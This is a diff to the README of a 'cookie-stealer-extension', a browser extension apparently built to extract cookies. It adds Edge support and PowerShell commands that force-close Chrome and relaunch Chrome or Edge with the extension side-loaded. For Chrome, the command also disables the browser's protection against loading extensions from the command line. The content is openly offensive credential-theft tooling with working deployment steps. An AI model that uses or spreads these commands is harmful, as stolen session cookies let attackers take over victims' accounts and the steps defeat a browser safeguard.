@@ -1,8 +1,8 @@
-# chrome-cookie-stealer-extension
+# cookie-stealer-extension
 
 ## Manual Cookie Extraction
 Update manifest with public key (optional)
-1. Go to `chrome://extensions/`
+1. Go to `chrome://extensions/` or `edge://extensions/`
 2. Enable "Developer Mode" 
 3. Load the folder with the extension. 
 4. View cookies in downloads
@@ -52,5 +52,8 @@ foreach ($b in $hash[0..15]) {
 # all insteances of chrome must be stopped for this to work
 Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
 
-start-process chrome.exe -ArgumentList '--load-extension=C:\Path\To\chrome-cookie-stealer-extension --disable-features=DisableLoadExtensionCommandLineSwitch https://google.com'
+start-process chrome.exe -ArgumentList '--load-extension=C:\Path\To\cookie-stealer-extension --disable-features=DisableLoadExtensionCommandLineSwitch https://google.com'
+# Note Edge does not require the disabled feature switch
+start-process msedge.exe -ArgumentList '--load-extension=C:\Path\To\cookie-stealer-extension https://google.com'
+
 ```
